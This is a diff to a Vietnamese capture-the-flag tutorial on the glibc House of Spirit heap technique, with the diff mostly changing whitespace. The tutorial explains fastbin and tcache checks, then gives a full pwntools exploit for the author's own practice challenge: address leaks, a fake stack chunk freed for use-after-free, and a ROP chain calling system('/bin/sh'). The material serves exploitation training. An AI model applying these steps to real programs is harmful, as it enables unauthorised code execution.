@@ -174,13 +174,20 @@ unlink (off, p, bck, fwd);
 - https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c
 - [catastrophe](./house_of_botcake/)
 - [mailman](https://github.com/wan-hyhty/CTFs_competition/tree/main/ImaginaryCTF2023/mailman)
+
 ---
+
 # House of Spirit
+
 ## Mở đầu
+
 - House of Spirit sẽ free fake chunk vào fastbin hoặc tcache, fastbin sẽ khó hơn vì có các security check.
 - House of Spirit sẽ cố gắng tạo fake chunk để free 1 chunk có địa chỉ từ stack và free nó vào bin, sau đó UAF.
+
 ## House of Spirit (fastbin)
+
 ### Security check
+
 ```c
 /* Like chunksize, but do not mask SIZE_BITS.  */
 #define chunksize_nomask(p)         ((p)->mchunk_size)
@@ -213,7 +220,9 @@ if (fail)
     }
 
 ```
+
 - Ở fastbin, ta cần tạo 2 fake chunk
+
 ```
     +-------+---------------------+------+
     | 0x00: | Chunk # 0 prev size | 0x00 |
@@ -229,17 +238,21 @@ if (fail)
     | 0x70: | Chunk # 1 content   | 0x00 |
     +-------+---------------------+------+
 ```
+
 - Khi này ta free chunk 1, security check ở trên sẽ kiểm tra next chunk (chunk 2)
 - Chỉ cần thoả mãn size chunk 2 > 16 và < 128kb (16 < size < 128kb)
 
 ## House of spirit (tcache)
+
 - Có vẻ khi tcache không kiểm tra next chunk, chỉ cần ta free địa chỉ hợp lệ.
 
 ## Example
+
 - Mình có tạo 1 chall để tập luyện khai thác house of Spirit
 
-### IDA 
-```c 
+### IDA
+
+```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   unsigned int size; // [rsp+0h] [rbp-120h] BYREF
@@ -314,7 +327,9 @@ LABEL_2:
   }
 }
 ```
+
 # Chuẩn bị
+
 ```python
 def create(size, content):
         sla(b'> ', '1')
@@ -331,18 +346,24 @@ def gift():
         p.recvuntil(b't: \n')
         return int(p.recvline(keepends = False).decode())
 ```
-# Phân tích 
+
+# Phân tích
+
 - Đầu tiên option 1 không giới hạn size, ta có thể leak libc bằng unsorted bin
 - Thứ 2 option 2 không kiểm tra idx, có nằm trong khoảng 0 đến <= 7 (có thể free các địa chỉ khác)
 - Thứ 3 option 3 cho phép ta viết vào vùng nhớ stack ở ngay dưới mảng lưu các địa chỉ heap
 - Thứ 4 là leak stack
-> từ 2 3 4 ta có thể tận dụng option 3 để fake chunk và 1 địa chỉ trỏ vào fake chunk, sau đó vì option 2 không kiểm tra idx nên ta có thể free địa chỉ trỏ đến fake chunk đó
+  > từ 2 3 4 ta có thể tận dụng option 3 để fake chunk và 1 địa chỉ trỏ vào fake chunk, sau đó vì option 2 không kiểm tra idx nên ta có thể free địa chỉ trỏ đến fake chunk đó
 
 ![Alt text](./house_of_spirit/image.png)
+
 # Khai thác
+
 ## Leak heap (có thể không cần thiết)
+
 - Để leak được heap đầu tiên ta sẽ malloc mà size là 0 để chương trình làm tròn là 0x20. Sau đó free chunk đó đi và malloc size 0 lại lần nữa
-> Mục đích size 0 là để khi read thì chúng ta không phải nhập gì tránh ghi đè
+  > Mục đích size 0 là để khi read thì chúng ta không phải nhập gì tránh ghi đè
+
 ```python
 create(8, b'a') # 0
 remove(0)
@@ -353,7 +374,9 @@ print(hex(heap))
 ```
 
 ## Leak libc
+
 - Leak libc bằng unsorted bin, khi chunk trong unsorted sẽ chứa 2 địa chỉ libc, ta sẽ ghi đè địa chỉ thứ nhất đế tận dụng %s địa chỉ thứ 2
+
 ```python
 create(0x500, b'a\n') # 1
 create(0x50, b'a') # 2
@@ -363,6 +386,7 @@ p.recvuntil(b'a' *8)
 libc.address = u64(p.recvline(keepends = False).ljust(8, b'\0')) - 0x219ce0
 info("libc address: " + hex(libc.address))
 ```
+
 ## Leak stack
 
 ```python
@@ -370,11 +394,12 @@ create(0x50, b'a\n') # 3
 create(0x50, b'a\n') # 4
 create(0x50, b'a\n') # 5
 create(0x50, b'a\n') # 5
-stack = gift()  
+stack = gift()
 info("Stack: " + hex(stack))
 ```
 
 ## Fake chunk
+
 ```python
 payload = flat(
         stack+0xa0,
@@ -386,14 +411,19 @@ payload = flat(
 )
 write(payload)
 ```
+
 ## Free fake chunk
+
 - Mục đích free 2 chunk 5 6 để tăng biến count trong tcache, khi unlink ta còn lượt count để malloc
+
 ```python
 remove(5)
 remove(6)
 remove(17)
 ```
+
 ## UAF
+
 ```python
 payload = flat(
         (stack+0xa0),
@@ -405,13 +435,16 @@ payload = flat(
 )
 write(payload)
 ```
+
 ## ROP
+
 - Ta có option 5 để kết thúc chương trình nên mình chọn nó để ROP
+
 ```python
 create(0x50, b'a')
 rop = ROP(libc)
 payload = flat(
-        stack, 
+        stack,
         rop.find_gadget(['ret']).address,
         rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')),
         libc.sym.system
@@ -420,6 +453,7 @@ create(0x50, payload)
 ```
 
 ## script
+
 ```python
 #!/usr/bin/python3
 
@@ -483,7 +517,7 @@ create(0x50, b'a\n') # 3
 create(0x50, b'a\n') # 4
 create(0x50, b'a\n') # 5
 create(0x50, b'a\n') # 5
-stack = gift()  
+stack = gift()
 info("Stack: " + hex(stack))
 
 payload = flat(
@@ -510,7 +544,7 @@ write(payload)
 create(0x50, b'a')
 rop = ROP(libc)
 payload = flat(
-        stack, 
+        stack,
         rop.find_gadget(['ret']).address,
         rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')),
         libc.sym.system
